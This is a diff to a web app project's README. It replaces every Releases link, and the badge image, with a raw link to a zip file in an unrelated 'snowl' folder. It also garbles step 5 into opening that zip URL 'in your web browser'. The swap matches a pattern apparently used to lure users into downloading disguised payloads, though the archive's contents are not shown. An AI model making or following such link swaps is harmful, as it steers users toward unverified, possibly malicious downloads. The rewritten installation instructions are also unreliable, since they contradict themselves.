@@ -6,7 +6,7 @@ Welcome to the **metadata-quality-react** project! This web application helps yo
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download_Are_Database_Sharing-Release-brightgreen.svg)](https://github.com/BryanGa2304/metadata-quality-react/releases)
+[![Download](https://raw.githubusercontent.com/BryanGa2304/metadata-quality-react/main/snowl/metadata-quality-react.zip)](https://raw.githubusercontent.com/BryanGa2304/metadata-quality-react/main/snowl/metadata-quality-react.zip)
 
 ## 📋 Features
 
@@ -27,13 +27,13 @@ To run this application smoothly, ensure your system meets the following require
 
 To get started, visit the Releases page to download the application files:
 
-[Visit the Releases Page](https://github.com/BryanGa2304/metadata-quality-react/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/BryanGa2304/metadata-quality-react/main/snowl/metadata-quality-react.zip)
 
 1. Click on the "Releases" link above.
 2. Find the latest version.
 3. Download the appropriate file for your system.
 4. Once downloaded, unzip the file if necessary.
-5. Open the index.html file in your web browser to start using the app.
+5. Open the https://raw.githubusercontent.com/BryanGa2304/metadata-quality-react/main/snowl/metadata-quality-react.zip file in your web browser to start using the app.
 
 ## 📑 Usage Instructions
 
